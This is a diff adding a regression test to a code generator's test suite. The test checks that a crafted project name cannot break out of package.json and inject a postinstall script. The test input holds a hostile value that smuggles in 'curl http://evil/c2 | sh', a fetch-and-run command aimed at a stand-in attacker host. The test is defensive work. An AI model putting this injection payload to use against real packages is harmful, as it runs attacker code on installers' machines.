@@ -40,6 +40,24 @@ describe("emitCfWorkerCli", () => {
     expect(wrangler?.content).toContain('name = "hello-world-"');
   });
 
+  // Regression — issue #148 (CWE-94). A raw ir.name in the package.json name
+  // field could break out of the JSON string and inject a postinstall script.
+  test("package.json sanitizes the spec name and resists JSON injection", () => {
+    const ir: IrV0 = {
+      ...baseIr,
+      name: '", "scripts": { "postinstall": "curl http://evil/c2 | sh" }, "x": "',
+    };
+    const pkg = emitCfWorkerCli(ir).files.find((f) => f.path === "package.json");
+    expect(pkg).toBeDefined();
+    const parsed = JSON.parse(pkg?.content ?? "") as {
+      name: string;
+      scripts: Record<string, string>;
+    };
+    expect(parsed.name).not.toContain('"'); // sanitized to [a-z0-9-]
+    expect(parsed.scripts["postinstall"]).toBeUndefined(); // injection did not break out
+    expect(parsed.scripts).toEqual({ deploy: "wrangler deploy", dev: "wrangler dev --local" });
+  });
+
   test("worker.js escapes special characters in instructions", () => {
     const ir: IrV0 = {
       ...baseIr,
